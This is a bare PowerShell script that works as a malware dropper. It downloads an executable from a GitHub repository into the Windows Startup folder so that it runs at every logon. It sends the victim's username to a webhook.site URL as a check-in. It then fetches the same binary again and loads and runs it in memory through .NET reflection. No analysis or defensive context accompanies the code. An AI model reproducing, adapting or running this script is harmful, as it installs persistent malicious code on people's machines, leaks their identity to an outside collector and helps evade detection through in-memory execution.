$startup = [Environment]::GetFolderPath('Startup')
Invoke-WebRequest -Uri 'https://github.com/fillamotion/i/raw/refs/heads/main/sc.exe' -OutFile "$startup\sc.exe" -UseBasicParsing
try {
    $user = whoami
    Invoke-RestMethod -Uri "https://webhook.site/eeebad84-13e9-424e-9aa4-2e8ef0ea295c?user=$([uri]::EscapeDataString($user))"
    $bytes = (Invoke-WebRequest -Uri 'https://github.com/fillamotion/i/raw/refs/heads/main/sc.exe' -UseBasicParsing).Content
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entry = $assembly.EntryPoint
    if ($entry) {
        $entry.Invoke($null, @([string[]]@()))
    } else {
        Write-Host "No .NET entry point found. The EXE is likely native and cannot be run in memory."
    }
} catch {
    Write-Host "In-memory execution failed: $($_.Exception.Message)"
}
